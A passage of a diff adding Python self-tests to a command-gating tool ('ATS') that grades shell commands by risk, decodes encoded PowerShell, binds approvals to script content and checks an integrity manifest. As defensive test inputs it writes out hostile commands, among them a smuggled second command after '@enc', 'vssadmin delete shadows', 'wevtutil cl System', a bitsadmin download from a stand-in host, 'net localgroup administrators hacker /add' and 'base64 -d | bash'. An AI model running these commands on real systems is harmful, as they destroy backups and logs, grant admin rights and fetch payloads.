@@ -10,6 +10,7 @@
 """
 from __future__ import annotations
 
+import base64
 import json
 import os
 import shutil
@@ -17,16 +18,54 @@ import subprocess
 import sys
 import tempfile
 import time
+import types
 from pathlib import Path
+
+sys.dont_write_bytecode = True
+os.environ["PYTHONDONTWRITEBYTECODE"] = "1"
 
 REPO = Path(__file__).resolve().parents[1]
 ATS = REPO / "scripts" / "ats.py"
 ATS_PLAN = REPO / "scripts" / "ats_plan.py"
+GUARD = REPO / "scripts" / "ats_guard.py"
 EXAMPLES = REPO / "references" / "examples"
 
 DEAD_PID = 2147483647
+TEST_PASSPHRASE = "ats-selftest-passphrase-2026"
 
 CASES = []
+
+
+def run_script(script, root, *args, timeout=90, passphrase=None):
+    """用指定脚本路径跑一次（沙箱里可能有脚本副本，不能写死仓库路径）。
+
+    passphrase 不为 None 时追加 --passphrase-stdin 并把口令从 stdin 送进去，
+    与真实用法一致：口令不进 argv。
+    """
+    cmd = [sys.executable, str(script), "--root", str(root)] + [str(a) for a in args]
+    stdin = None
+    if passphrase is not None:
+        cmd.append("--passphrase-stdin")
+        stdin = passphrase + "\n"
+    env = dict(os.environ)
+    env["PYTHONIOENCODING"] = "utf-8"
+    env["PYTHONUTF8"] = "1"
+    env["PYTHONDONTWRITEBYTECODE"] = "1"
+    proc = subprocess.run(cmd, input=stdin, capture_output=True, text=True, env=env,
+                          encoding="utf-8", errors="replace", timeout=timeout)
+    return proc.returncode, (proc.stdout or ""), (proc.stderr or "")
+
+
+def init_and_seal(root, guard=None, passphrase=TEST_PASSPHRASE):
+    """建密钥（若还没有）+ 封签，口令走 stdin。"""
+    guard = Path(guard) if guard else GUARD
+    key = Path(root) / "ats_guard_key.json"
+    if not key.is_file():
+        rc, out, err = run_script(guard, root, "init", "--confirm",
+                                  passphrase=passphrase)
+        if rc != 0:
+            return rc, out, err
+    return run_script(guard, root, "seal", "--confirm", passphrase=passphrase)
 
 
 def case(fn):
@@ -40,22 +79,38 @@ class Sandbox:
     def __init__(self):
         self.dir = Path(tempfile.mkdtemp(prefix="ats-selftest-"))
         self.root = self.dir / "root"
+        self.auto_seal = True
+        self.manifest = self.root / "ats_guard_manifest.json"
 
     def cleanup(self):
         shutil.rmtree(self.dir, ignore_errors=True)
 
-    def ats(self, *args, timeout=90):
-        return self._run(ATS, *args, timeout=timeout)
+    def seal(self):
+        """给本沙箱重新封签：临时 root 的清单只对当前代码快照有效。"""
+        init_and_seal(self.root)
 
-    def plan(self, *args, timeout=120):
-        return self._run(ATS_PLAN, *args, timeout=timeout)
+    def guard(self, *args, timeout=60):
+        return self._run(GUARD, *args, timeout=timeout)
 
-    def _run(self, script, *args, timeout):
+    def ats(self, *args, timeout=90, passphrase=TEST_PASSPHRASE):
+        return self._run(ATS, *args, timeout=timeout, passphrase=passphrase)
+
+    def plan(self, *args, timeout=120, passphrase=TEST_PASSPHRASE):
+        return self._run(ATS_PLAN, *args, timeout=timeout, passphrase=passphrase)
+
+    def _run(self, script, *args, timeout, passphrase=TEST_PASSPHRASE):
+        if self.auto_seal:
+            self.seal()
         cmd = [sys.executable, str(script), "--root", str(self.root)] + [str(a) for a in args]
+        stdin = None
+        if passphrase is not None:
+            cmd.append("--passphrase-stdin")
+            stdin = passphrase + "\n"
         env = dict(os.environ)
         env["PYTHONIOENCODING"] = "utf-8"
         env["PYTHONUTF8"] = "1"
-        proc = subprocess.run(cmd, capture_output=True, text=True, env=env,
+        env["PYTHONDONTWRITEBYTECODE"] = "1"
+        proc = subprocess.run(cmd, input=stdin, capture_output=True, text=True, env=env,
                               encoding="utf-8", errors="replace", timeout=timeout)
         return proc.returncode, (proc.stdout or ""), (proc.stderr or "")
 
@@ -171,6 +226,41 @@ def plan_dependency_propagation():
         expect(counts.get("failed") == 1, "应有 1 个 failed，实际 %r" % counts)
         expect(counts.get("skipped") == 2, "应有 2 个 skipped（级联），实际 %r" % counts)
         expect(counts.get("succeeded") == 1, "应有 1 个 succeeded（独立分支），实际 %r" % counts)
+    finally:
+        sb.cleanup()
+
+
+@case
+def plan_step_rejects_hook():
+    """Plan 的 Step 不支持 @enc：提交阶段就报 hook_not_supported，不静默当普通参数。"""
+    sb = Sandbox()
+    try:
+        spec = sb.dir / "plan-hook.json"
+        spec.write_text(json.dumps({
+            "id": "hookstep", "title": "t",
+            "stages": [{"id": "s1", "mode": "serial", "steps": [
+                {"id": "x", "command": "python -c \"print(1)\" @enc --from gbk --to utf-8 a.py",
+                 "level": "L0", "timeout": 60}]}],
+        }, ensure_ascii=False), encoding="utf-8")
+        rc, payload = sb.json_out_plan("submit_plan", "--spec", spec)
+        expect(rc == 2, "含 @enc 的 Step 应被拒（EXIT_USAGE），实际 %s\n%s" % (rc, payload))
+        expect(payload.get("error") == "spec_invalid",
+               "应报 spec_invalid，实际 %r" % payload.get("error"))
+        errors = payload.get("errors") or []
+        expect(any("hook_not_supported" in e for e in errors),
+               "应含 hook_not_supported，实际 %r" % (errors,))
+        expect(not (sb.root / "schedules" / "hookstep").exists(),
+               "被拒时不应落盘 schedule")
+
+        # 反向确认：不带 @enc 的同构 spec 仍可提交，说明拒绝只针对钩子写法
+        spec.write_text(json.dumps({
+            "id": "plainstep", "title": "t",
+            "stages": [{"id": "s1", "mode": "serial", "steps": [
+                {"id": "x", "command": "python -c \"print(1)\"", "level": "L0",
+                 "timeout": 60}]}],
+        }, ensure_ascii=False), encoding="utf-8")
+        rc, payload = sb.json_out_plan("submit_plan", "--spec", spec)
+        expect(rc == 0, "普通 Step 应能提交，实际 %s\n%s" % (rc, payload))
     finally:
         sb.cleanup()
 
@@ -341,6 +431,349 @@ def pack_level_respects_hard_floor():
 
 
 @case
+def hook_args_do_not_run_through_shell():
+    """`@enc` 参数只以 argv 交给转换器：参数里的 `;` 不得变成第二条命令。
+
+    修复前 run_post_hook 用 shell=True 拼字符串执行，`echo hi @enc x; copy nul f`
+    会让主命令 L0 直通、钩子段却执行任意 shell —— 权限门与预检全程没看见。
+    """
+    sb = Sandbox()
+    old = os.environ.get("ATS_ENCODER_PATH")
+    try:
+        tools = sb.dir / "tools"
+        tools.mkdir(parents=True, exist_ok=True)
+        (tools / "encoding_converter.py").write_text(
+            "import sys\nprint('ARGV', sys.argv[1:])\n", encoding="utf-8")
+        os.environ["ATS_ENCODER_PATH"] = str(tools / "encoding_converter.py")
+
+        sb.json_out("create", "hook", "--cwd", str(sb.dir), "--level", "L0",
+                    "--command", "echo hi @enc x; copy nul PWN.txt")
+        rc, run = sb.json_out("run", "hook", "--wait")
+        expect(rc == 0, "L0 任务应放行，实际退出 %s" % rc)
+        rc, st = sb.json_out("status", "hook")
+        expect(st["status"] == "succeeded", "任务应 succeeded，实际 %s" % st["status"])
+        rec = json.loads((sb.root / "tasks" / "hook" / "task.json").read_text(encoding="utf-8"))
+        expect((rec.get("post_hook") or {}).get("status") == "ok",
+               "钩子应 ok，实际 %r" % (rec.get("post_hook") or {}).get("status"))
+        expect(not (sb.dir / "PWN.txt").exists(),
+               "钩子参数被 shell 解释了：PWN.txt 被创建")
+        log = Path(rec["post_hook"]["log"]).read_text(encoding="utf-8", errors="replace")
+        expect("copy" in log and "nul" in log,
+               "转换器应以 argv 收到参数，实际日志 %r" % log)
+    finally:
+        if old is None:
+            os.environ.pop("ATS_ENCODER_PATH", None)
+        else:
+            os.environ["ATS_ENCODER_PATH"] = old
+        sb.cleanup()
+
+
+@case
+def hook_args_enter_gate_text():
+    """钩子参数参与等级推导，也进审批绑定文本：不能搭 L0 主命令的车。"""
+    sb = Sandbox()
+    try:
+        rc, task = sb.json_out("create", "hookrisk", "--level", "L0",
+                               "--command", "echo hi @enc x; del PWN.txt")
+        expect(rc == 0, "create 退出码应为 0，实际 %s" % rc)
+        expect(task["task"]["level"] == "L3",
+               "钩子参数含 del 应登记 L3，实际 %s" % task["task"]["level"])
+        rc, out, err = sb.ats("run", "hookrisk", "--wait")
+        expect(rc == 4, "L3 任务应挂起待审批，实际退出 %s\n%s%s" % (rc, out, err))
+        payload = json.loads(out)
+        expect(payload.get("error") == "approval_required",
+               "应报 approval_required，实际 %r" % payload.get("error"))
+        expect("@enc" in (payload.get("approval") or {}).get("command", ""),
+               "审批应绑定含 @enc 参数的完整原文，实际 %r"
+               % (payload.get("approval") or {}).get("command"))
+    finally:
+        sb.cleanup()
+
+
+@case
+def hook_args_decoded_payload_raises_level():
+    """@enc 参数里的编码载荷也要解码：钩子段写 -EncodedCommand 同样抬到 L3。"""
+    sb = Sandbox()
+    try:
+        blob = base64.b64encode(
+            "Remove-Item -Recurse -Force C:\\tmp\\x".encode("utf-16-le")).decode()
+        rc, task = sb.json_out(
+            "create", "hookb64", "--level", "L0", "--command",
+            "echo hi @enc --from gbk --to utf-8 powershell -EncodedCommand " + blob)
+        expect(rc == 0, "create 退出码应为 0，实际 %s" % rc)
+        expect(task["task"]["level"] == "L3",
+               "钩子段编码载荷解出 Remove-Item 后应登记 L3，实际 %s"
+               % task["task"]["level"])
+        expect(task["task"]["command"] == "echo hi",
+               "主命令应只剩 echo hi，实际 %r" % task["task"]["command"])
+        expect("-EncodedCommand" in (task["task"].get("post_hook") or {}).get("args", ""),
+               "钩子参数应原样保留在 post_hook，实际 %r" % task["task"].get("post_hook"))
+    finally:
+        sb.cleanup()
+
+
+@case
+def hook_glob_expands_multiple_files():
+    """`@enc` 的通配路径由 ATS 自己展开（钩子不经 shell），一条钩子覆盖多个文件。"""
+    sb = Sandbox()
+    old = os.environ.get("ATS_ENCODER_PATH")
+    try:
+        tools = sb.dir / "tools"
+        tools.mkdir(parents=True, exist_ok=True)
+        (tools / "encoding_converter.py").write_text(
+            "import sys\nprint('ARGV', sys.argv[1:])\n", encoding="utf-8")
+        os.environ["ATS_ENCODER_PATH"] = str(tools / "encoding_converter.py")
+        logs = sb.dir / "logs"
+        logs.mkdir(parents=True, exist_ok=True)
+        for name in ("a.log", "b.log", "c.log"):
+            (logs / name).write_text("x", encoding="utf-8")
+
+        sb.json_out("create", "glob1", "--cwd", str(sb.dir), "--level", "L0",
+                    "--command", "echo hi @enc --from gbk --to utf-8 logs/*.log")
+        rc, run = sb.json_out("run", "glob1", "--wait")
+        expect(rc == 0, "任务应放行，实际退出 %s" % rc)
+        rec = json.loads((sb.root / "tasks" / "glob1" / "task.json").read_text(encoding="utf-8"))
+        hook = rec.get("post_hook") or {}
+        expect(hook.get("status") == "ok", "钩子应 ok，实际 %r" % hook.get("status"))
+        expect(hook.get("expanded") == 3, "应展开 3 个文件，实际 %r" % hook.get("expanded"))
+        expect(hook.get("glob") == "logs/*.log", "应记录通配原文，实际 %r" % hook.get("glob"))
+        runs = hook.get("runs") or []
+        expect(len(runs) == 3, "应逐条调用 3 次，实际 %d 次" % len(runs))
+        expect(all(r["exit_code"] == 0 for r in runs),
+               "三次调用都应成功，实际 %r" % runs)
+        names = [Path(r["path"]).name for r in runs]
+        expect(names == ["a.log", "b.log", "c.log"],
+               "展开顺序应按字典序，实际 %r" % names)
+        log = Path(hook["log"]).read_text(encoding="utf-8", errors="replace")
+        expect("glob logs/*.log -> 3 path(s)" in log, "日志头应记录展开清单，实际 %r" % log[:200])
+        expect(log.count("ARGV") == 3, "转换器应被调用 3 次，实际日志 %r" % log)
+    finally:
+        if old is None:
+            os.environ.pop("ATS_ENCODER_PATH", None)
+        else:
+            os.environ["ATS_ENCODER_PATH"] = old
+        sb.cleanup()
+
+
+@case
+def hook_glob_no_match_fails_loudly():
+    """通配 0 匹配必须报错：绝不能把字面量 `*.log` 当文件名交给转换器。"""
+    sb = Sandbox()
+    old = os.environ.get("ATS_ENCODER_PATH")
+    try:
+        tools = sb.dir / "tools"
+        tools.mkdir(parents=True, exist_ok=True)
+        (tools / "encoding_converter.py").write_text(
+            "import sys\nprint('ARGV', sys.argv[1:])\n", encoding="utf-8")
+        os.environ["ATS_ENCODER_PATH"] = str(tools / "encoding_converter.py")
+
+        sb.json_out("create", "glob0", "--cwd", str(sb.dir), "--level", "L0",
+                    "--command", "echo hi @enc --from gbk --to utf-8 missing/*.log")
+        rc, run = sb.json_out("run", "glob0", "--wait")
+        rc, st = sb.json_out("status", "glob0")
+        expect(st["status"] == "failed", "无匹配时任务应 failed，实际 %s" % st["status"])
+        rec = json.loads((sb.root / "tasks" / "glob0" / "task.json").read_text(encoding="utf-8"))
+        hook = rec.get("post_hook") or {}
+        expect(hook.get("error_type") == "hook_glob_no_match",
+               "应报 hook_glob_no_match，实际 %r" % hook.get("error_type"))
+        log = Path(hook["log"]).read_text(encoding="utf-8", errors="replace")
+        expect("hook_glob_no_match" in log, "日志应写明原因，实际 %r" % log)
+        expect("ARGV" not in log, "无匹配时不应调用转换器，实际 %r" % log)
+    finally:
+        if old is None:
+            os.environ.pop("ATS_ENCODER_PATH", None)
+        else:
+            os.environ["ATS_ENCODER_PATH"] = old
+        sb.cleanup()
+
+
+@case
+def hook_glob_rejects_mixed_paths():
+    """通配路径与手写路径同时出现含义不明，直接拒绝而不是猜。"""
+    sb = Sandbox()
+    old = os.environ.get("ATS_ENCODER_PATH")
+    try:
+        tools = sb.dir / "tools"
+        tools.mkdir(parents=True, exist_ok=True)
+        (tools / "encoding_converter.py").write_text(
+            "import sys\nprint('ARGV', sys.argv[1:])\n", encoding="utf-8")
+        os.environ["ATS_ENCODER_PATH"] = str(tools / "encoding_converter.py")
+        (sb.dir / "a.txt").write_text("x", encoding="utf-8")
+
+        sb.json_out("create", "globamb", "--cwd", str(sb.dir), "--level", "L0",
+                    "--command", "echo hi @enc a.txt *.txt")
+        sb.json_out("run", "globamb", "--wait")
+        rec = json.loads((sb.root / "tasks" / "globamb" / "task.json").read_text(encoding="utf-8"))
+        hook = rec.get("post_hook") or {}
+        expect(hook.get("error_type") == "hook_glob_ambiguous",
+               "应报 hook_glob_ambiguous，实际 %r" % hook.get("error_type"))
+        expect("ARGV" not in Path(hook["log"]).read_text(encoding="utf-8", errors="replace"),
+               "歧义时不应调用转换器")
+    finally:
+        if old is None:
+            os.environ.pop("ATS_ENCODER_PATH", None)
+        else:
+            os.environ["ATS_ENCODER_PATH"] = old
+        sb.cleanup()
+
+
+@case
+def hook_glob_skips_flag_values():
+    """flag 的值即使含 `*` 也不展开：`--include *.log` 必须原样传给转换器。"""
+    sb = Sandbox()
+    old = os.environ.get("ATS_ENCODER_PATH")
+    try:
+        tools = sb.dir / "tools"
+        tools.mkdir(parents=True, exist_ok=True)
+        (tools / "encoding_converter.py").write_text(
+            "import sys\nprint('ARGV', sys.argv[1:])\n", encoding="utf-8")
+        os.environ["ATS_ENCODER_PATH"] = str(tools / "encoding_converter.py")
+        (sb.dir / "x.log").write_text("x", encoding="utf-8")
+
+        sb.json_out("create", "globflag", "--cwd", str(sb.dir), "--level", "L0",
+                    "--command", "echo hi @enc --from gbk --to utf-8 --include *.log")
+        sb.json_out("run", "globflag", "--wait")
+        rec = json.loads((sb.root / "tasks" / "globflag" / "task.json").read_text(encoding="utf-8"))
+        hook = rec.get("post_hook") or {}
+        expect(hook.get("status") == "ok", "钩子应 ok，实际 %r" % hook.get("status"))
+        expect(not hook.get("expanded"), "flag 值不应被展开，实际 %r" % hook.get("expanded"))
+        log = Path(hook["log"]).read_text(encoding="utf-8", errors="replace")
+        expect("*.log" in log, "字面量应原样传给转换器，实际 %r" % log)
+        expect("glob " not in log, "不应写展开头，实际 %r" % log)
+    finally:
+        if old is None:
+            os.environ.pop("ATS_ENCODER_PATH", None)
+        else:
+            os.environ["ATS_ENCODER_PATH"] = old
+        sb.cleanup()
+
+
+@case
+def hook_glob_survives_valueless_flags():
+    """无值开关（`--dry-run`）排在通配之前也不影响展开：`-` 开头的 token 永不当值。"""
+    sb = Sandbox()
+    old = os.environ.get("ATS_ENCODER_PATH")
+    try:
+        tools = sb.dir / "tools"
+        tools.mkdir(parents=True, exist_ok=True)
+        (tools / "encoding_converter.py").write_text(
+            "import sys\nprint('ARGV', sys.argv[1:])\n", encoding="utf-8")
+        os.environ["ATS_ENCODER_PATH"] = str(tools / "encoding_converter.py")
+        logs = sb.dir / "logs"
+        logs.mkdir(parents=True, exist_ok=True)
+        for name in ("a.log", "b.log"):
+            (logs / name).write_text("x", encoding="utf-8")
+
+        sb.json_out("create", "globflag2", "--cwd", str(sb.dir), "--level", "L0",
+                    "--command", "echo hi @enc --dry-run --from gbk --to utf-8 logs/*.log")
+        sb.json_out("run", "globflag2", "--wait")
+        rec = json.loads((sb.root / "tasks" / "globflag2" / "task.json").read_text(encoding="utf-8"))
+        hook = rec.get("post_hook") or {}
+        expect(hook.get("status") == "ok",
+               "钩子应 ok，实际 %r / %r" % (hook.get("status"), hook.get("error_type")))
+        expect(hook.get("expanded") == 2, "应展开 2 个文件，实际 %r" % (hook.get("expanded"),))
+        log = Path(hook["log"]).read_text(encoding="utf-8", errors="replace")
+        expect(log.count("ARGV") == 2, "转换器应被调用 2 次，实际 %r" % log[:200])
+        expect("--dry-run" in log, "开关应原样传给转换器，实际 %r" % log[:200])
+    finally:
+        if old is None:
+            os.environ.pop("ATS_ENCODER_PATH", None)
+        else:
+            os.environ["ATS_ENCODER_PATH"] = old
+        sb.cleanup()
+
+
+def _download_args(**kw):
+    """构造 `download` 子命令的 argparse 结果，用来直接调 `_build_download_spec`。"""
+    base = dict(name=None, url=[], file=[], out=None, sha256=None, size=None,
+                header=[], proxy=None, concurrency=2, rate=0, retry=2,
+                backoff=3, io_timeout=30, no_resume=False, overwrite=False,
+                insecure=False)
+    base.update(kw)
+    return types.SimpleNamespace(**base)
+
+
+@case
+def download_manifest_glob_merges():
+    """`--file` 支持通配：多个清单一次读入并合并，重复条目照旧去重。"""
+    sb = Sandbox()
+    try:
+        sys.path.insert(0, str(REPO / "scripts"))
+        import ats
+
+        mdir = sb.dir / "manifests"
+        mdir.mkdir(parents=True, exist_ok=True)
+        (mdir / "a.txt").write_text(
+            "https://example.com/a.bin\nhttps://example.com/shared.bin\n", encoding="utf-8")
+        (mdir / "b.csv").write_text(
+            "url,save_as\nhttps://example.com/b.bin,b.bin\n"
+            "https://example.com/shared.bin\n", encoding="utf-8")
+
+        spec, err = ats._build_download_spec(
+            _download_args(file=[str(mdir / "*.txt"), str(mdir / "*.csv")]))
+        expect(err is None, "通配清单应能合并，实际错误 %r" % (err,))
+        expect(len(spec["items"]) == 3, "去重后应剩 3 条，实际 %d" % len(spec["items"]))
+        expect(spec.get("deduped") == 1, "应记 1 条重复，实际 %r" % spec.get("deduped"))
+        expect([Path(p).name for p in spec["manifests"]] == ["a.txt", "b.csv"],
+               "展开结果应按字典序，实际 %r" % (spec["manifests"],))
+
+        literal, err2 = ats._build_download_spec(_download_args(file=[str(mdir / "a.txt")]))
+        expect(err2 is None, "字面清单路径应照旧可用，实际错误 %r" % (err2,))
+        expect(len(literal["items"]) == 2, "字面清单应读到 2 条，实际 %d" % len(literal["items"]))
+    finally:
+        sb.cleanup()
+
+
+@case
+def download_manifest_glob_no_match():
+    """通配清单 0 匹配必须报错：不能把字面量 `*.txt` 当成真实文件名。"""
+    sb = Sandbox()
+    try:
+        sys.path.insert(0, str(REPO / "scripts"))
+        import ats
+
+        spec, err = ats._build_download_spec(
+            _download_args(file=[str(sb.dir / "missing" / "*.txt")]))
+        expect(err is not None and err.startswith("manifest_no_match:"),
+               "应报 manifest_no_match，实际 %r" % (err,))
+        missing, err2 = ats._build_download_spec(
+            _download_args(file=[str(sb.dir / "nope.txt")]))
+        expect(err2 is not None and err2.startswith("manifest_not_found:"),
+               "字面路径缺失应报 manifest_not_found，实际 %r" % (err2,))
+    finally:
+        sb.cleanup()
+
+
+@case
+def download_manifest_outputs_conflict():
+    """多个清单给出不同 outputs 且没写 --out 时拒绝，不猜用哪一个。"""
+    sb = Sandbox()
+    try:
+        sys.path.insert(0, str(REPO / "scripts"))
+        import ats
+
+        mdir = sb.dir / "manifests"
+        mdir.mkdir(parents=True, exist_ok=True)
+        for name, out, url in (("1.json", sb.dir / "out1", "https://example.com/1.bin"),
+                               ("2.json", sb.dir / "out2", "https://example.com/2.bin")):
+            (mdir / name).write_text(json.dumps(
+                {"outputs": str(out), "items": [{"url": url}]}), encoding="utf-8")
+
+        spec, err = ats._build_download_spec(_download_args(file=[str(mdir / "*.json")]))
+        expect(err is not None and err.startswith("manifest_outputs_conflict:"),
+               "outputs 冲突应拒绝，实际 %r" % (err,))
+
+        ok, err2 = ats._build_download_spec(
+            _download_args(file=[str(mdir / "*.json")], out=str(sb.dir / "out")))
+        expect(err2 is None, "写了 --out 就应以它为准，实际 %r" % (err2,))
+        expect(Path(ok["outputs"]) == (sb.dir / "out").resolve(),
+               "outputs 应取 --out，实际 %r" % ok["outputs"])
+        expect(len(ok["items"]) == 2, "两份清单应各贡献 1 条，实际 %d" % len(ok["items"]))
+    finally:
+        sb.cleanup()
+
+
+@case
 def whitelist_does_not_bypass_hard_floor():
     """白名单不得穿透硬下限：危险命令即使命中 allow_rules 也要走审批。"""
     sb = Sandbox()
@@ -369,6 +802,158 @@ def whitelist_does_not_bypass_hard_floor():
                    "安全命令 %r 应仍按白名单放行，实际 reason=%s" % (cmd, gate["reason"]))
             expect(gate.get("whitelist_ignored") is None,
                    "安全命令 %r 不应标注 whitelist_ignored" % cmd)
+    finally:
+        sb.cleanup()
+
+
+@case
+def encoded_payload_is_decoded_before_verdict():
+    """编码载荷必须先解出来再判：base64 不得把危险命令洗成 L1 静默直通。"""
+    sys.path.insert(0, str(REPO / "scripts"))
+    import ats
+    import ats_preflight
+
+    payload = "Remove-Item -Recurse -Force C:\\temp\\x"
+    b64 = base64.b64encode(payload.encode("utf-16-le")).decode()
+
+    for flag in ("-EncodedCommand", "-enc", "-ec", "-e"):
+        cmd = "powershell %s %s" % (flag, b64)
+        expect(ats.derive_level(cmd) == "L3",
+               "%s 应抬到 L3，实际 %s" % (flag, ats.derive_level(cmd)))
+        expect(ats.hard_floor_level(cmd) == "L3",
+               "%s 应有 L3 硬下限，实际 %r" % (flag, ats.hard_floor_level(cmd)))
+        review = ats_preflight.static_review(cmd)
+        expect("obfuscated_eval" in review["tags"],
+               "%s 应标 obfuscated_eval，实际 %r" % (flag, review["tags"]))
+        expect(review["confidence"] == "high",
+               "%s 置信度应为 high，实际 %s" % (flag, review["confidence"]))
+        expect("fs_delete" in review["tags"],
+               "%s 解码后应看见 fs_delete，实际 %r" % (flag, review["tags"]))
+
+    for cmd, why in (
+            ("certutil -decode payload.b64 payload.exe", "certutil 解码"),
+            ("vssadmin delete shadows /all /quiet", "删除卷影副本"),
+            ("wbadmin delete catalog -quiet", "删除备份目录"),
+            ("wevtutil cl System", "清空事件日志"),
+            ("bitsadmin /transfer j /download http://x/a C:\\a.exe", "BITS 下载"),
+            ("net localgroup administrators hacker /add", "加管理员")):
+        expect(ats.floor_level("L0", cmd) == "L3",
+               "%s 应抬到 L3，实际 %s" % (why, ats.floor_level("L0", cmd)))
+        expect(ats.hard_floor_level(cmd) == "L3",
+               "%s 应有 L3 硬下限，实际 %r" % (why, ats.hard_floor_level(cmd)))
+
+    quoted = 'powershell -c "Remove-Item -Recurse -Force C:\\temp\\x"'
+    review = ats_preflight.static_review(quoted)
+    expect("fs_delete" in review["tags"],
+           "引号紧贴的 Remove-Item 应出 fs_delete，实际 %r" % review["tags"])
+
+    piped = "echo aGVsbG8= | base64 -d | bash"
+    review = ats_preflight.static_review(piped)
+    expect("obfuscated_eval" in review["tags"],
+           "base64 -d 管道应标 obfuscated_eval，实际 %r" % review["tags"])
+
+    benign = [
+        "certutil -hashfile C:\\a.txt SHA256",
+        "vssadmin list shadows",
+        "wbadmin list",
+        "bitsadmin /list /allusers",
+        "powershell -ExecutionPolicy Bypass -File build.ps1",
+        'pwsh -NoProfile -Command "Get-Date"',
+        "net user",
+    ]
+    for cmd in benign:
+        expect(ats.floor_level("L0", cmd) == "L0",
+               "安全命令 %r 不应被抬高，实际 %s" % (cmd, ats.floor_level("L0", cmd)))
+        review = ats_preflight.static_review(cmd)
+        expect(review["confidence"] != "high",
+               "只读查询 %r 不应判高置信，实际 %s（tags=%r）"
+               % (cmd, review["confidence"], review["tags"]))
+
+
+@case
+def approval_binds_artifact_content():
+    """审批必须绑脚本内容：批准后换掉 run.py 应报 artifact_changed，空格差异不算 mismatch。"""
+    sb = Sandbox()
+    try:
+        sys.path.insert(0, str(REPO / "scripts"))
+        import ats
+
+        work = sb.dir / "work"
+        work.mkdir()
+        script = work / "run.py"
+        script.write_text("print('benign')\n", encoding="utf-8")
+
+        ctx = {"source": "run", "task_id": "t1", "cwd": str(work)}
+        rec = ats.create_approval(str(sb.root), "python run.py", "L2", ctx)
+        expect(rec.get("artifacts"), "审批应记录脚本指纹，实际 %r" % rec.get("artifacts"))
+        art = rec["artifacts"][0]
+        expect(art.get("sha256"), "存在的脚本应有 sha256，实际 %r" % art)
+
+        rec["status"] = "approved"
+        ats.save_approval(str(sb.root), rec)
+
+        ok = ats.approval_check(str(sb.root), rec["id"], "python run.py", ctx)
+        expect(ok["ok"], "内容未变应放行，实际 %r" % ok["error"])
+
+        spaced = ats.approval_check(str(sb.root), rec["id"], "python   run.py", ctx)
+        expect(spaced["ok"], "空白差异不应判 mismatch，实际 %r" % spaced["error"])
+
+        script.write_text("import shutil;shutil.rmtree('C:/temp/x')\n", encoding="utf-8")
+        changed = ats.approval_check(str(sb.root), rec["id"], "python run.py", ctx)
+        expect(changed["error"] == "artifact_changed",
+               "脚本被替换应报 artifact_changed，实际 %r" % changed["error"])
+
+        other = ats.approval_check(str(sb.root), rec["id"], "python other.py", ctx)
+        expect(other["error"] == "mismatch",
+               "换脚本名应报 mismatch，实际 %r" % other["error"])
+
+        script.unlink()
+        gone = ats.approval_check(str(sb.root), rec["id"], "python run.py", ctx)
+        expect(gone["error"] == "artifact_changed",
+               "脚本被删也应报 artifact_changed，实际 %r" % gone["error"])
+
+        for cmd in ("echo hi", "python -c \"print(1)\"", "git status"):
+            expect(not ats.artifact_digests(cmd, {"cwd": str(work)}),
+                   "无脚本文件的命令不应记录指纹：%r" % cmd)
+    finally:
+        sb.cleanup()
+
+
+@case
+def hook_target_not_bound_as_artifact():
+    """`@enc` 参数里的 .py 是转码目标，不是执行体：改了它不该报 artifact_changed。
+
+    修复前 artifact_digests 把整段拼合文本按空白切词，钩子参数里的
+    `data.py` 也被当成待绑定脚本 —— 转码完目标文件一变，重跑就被拦下。
+    """
+    sb = Sandbox()
+    try:
+        sys.path.insert(0, str(REPO / "scripts"))
+        import ats
+
+        work = sb.dir / "work"
+        work.mkdir()
+        script = work / "build.py"
+        target = work / "data.py"
+        script.write_text("print('build')\n", encoding="utf-8")
+        target.write_text("x = 1\n", encoding="utf-8")
+
+        cmd = "python build.py @enc --from gbk --to utf-8 data.py"
+        ctx = {"source": "run", "task_id": "t1", "cwd": str(work)}
+        rec = ats.create_approval(str(sb.root), cmd, "L2", ctx)
+        names = [Path(a["path"]).name for a in rec.get("artifacts") or []]
+        expect(names == ["build.py"], "只应绑定主命令里的脚本，实际 %r" % names)
+
+        rec["status"] = "approved"
+        ats.save_approval(str(sb.root), rec)
+        target.write_text("x = 2\n", encoding="utf-8")
+        ok = ats.approval_check(str(sb.root), rec["id"], cmd, ctx)
+        expect(ok["ok"], "转码目标变化不应拦下，实际 %r" % ok["error"])
+
+        script.write_text("print('tampered')\n", encoding="utf-8")
+        changed = ats.approval_check(str(sb.root), rec["id"], cmd, ctx)
+        expect(changed["error"] == "artifact_changed",
+               "主脚本被换掉仍应报 artifact_changed，实际 %r" % changed["error"])
     finally:
         sb.cleanup()
 
@@ -565,6 +1150,571 @@ def create_derives_level_when_omitted():
         rc, task = sb.json_out("create", "forced", "--command", "echo hi", "--level", "L0")
         expect(task["task"]["level"] == "L0",
                "显式 --level 应优先，实际 %r" % task["task"]["level"])
+    finally:
+        sb.cleanup()
+
+
+# ---------------------------------------------------------------- 看门狗准入
+
+@case
+def guard_blocks_tampered_core_file():
+    """清单里 ats.py 的摘要被改 → 启动即拒，命令不执行。"""
+    sb = Sandbox()
+    try:
+        sb.ats("create", "t1", "--command", "echo hi")
+        sb.auto_seal = False
+        data = json.loads(sb.manifest.read_text(encoding="utf-8"))
+        data["files"]["ats.py"] = "0" * 64
+        sb.manifest.write_text(json.dumps(data, ensure_ascii=False), encoding="utf-8")
+
+        rc, out, err = sb.ats("list")
+        expect(rc == 4, "看门狗失败应返回 EXIT_DENIED，实际 %s\n%s\n%s" % (rc, out, err))
+        payload = json.loads(out)
+        expect(payload.get("error") == "guard_check_failed",
+               "应报 guard_check_failed，实际 %r" % payload.get("error"))
+        stage = (payload.get("detail") or {}).get("stage")
+        expect(stage == "guard_verify",
+               "应停在 guard_verify 阶段，实际 %r" % stage)
+    finally:
+        sb.cleanup()
+
+
+@case
+def guard_blocks_without_manifest():
+    """没有清单（未封签）时同样拒绝，不允许「默认放行」。"""
+    sb = Sandbox()
+    try:
+        sb.auto_seal = False
+        rc, out, err = sb.ats("list")
+        expect(rc == 4, "无清单应返回 EXIT_DENIED，实际 %s\n%s\n%s" % (rc, out, err))
+        payload = json.loads(out)
+        expect(payload.get("error") == "guard_check_failed",
+               "应报 guard_check_failed，实际 %r" % payload.get("error"))
+        detail = (payload.get("detail") or {}).get("detail") or {}
+        expect(detail.get("error") == "manifest_missing",
+               "应报 manifest_missing，实际 %r" % detail.get("error"))
+    finally:
+        sb.cleanup()
+
+
+@case
+def guard_blocks_unsealed_new_script():
+    """清单之后新增的脚本属于未封签文件，必须被发现。"""
+    sb = Sandbox()
+    sb.auto_seal = False
+    try:
+        scripts = sb.dir / "scripts"
+        scripts.mkdir(parents=True, exist_ok=True)
+        for name in ("ats.py", "ats_guard.py", "ats_preflight.py", "ats_plan.py"):
